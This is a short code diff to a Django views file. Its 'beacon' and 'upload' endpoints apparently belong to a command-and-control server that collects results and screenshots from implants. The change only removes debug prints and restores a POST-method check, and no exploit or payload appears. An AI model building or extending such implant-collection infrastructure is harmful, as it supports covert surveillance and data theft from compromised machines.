@@ -32,16 +32,14 @@ def beacon(request):
 
 @csrf_exempt
 def upload(request):
-    print(request.POST.get('result', None))
-#    if request.method != 'POST':
-#        return HttpResponse("Bad Request", status=400)
+    if request.method != 'POST':
+        return HttpResponse("Bad Request", status=400)
 
     implant_id = request.POST.get('id', None)
     result_data = request.POST.get('result', None)
 
     try:
         file = request.FILES.get("screenshot")
-        print(file)
     except:
         file = 0 
 
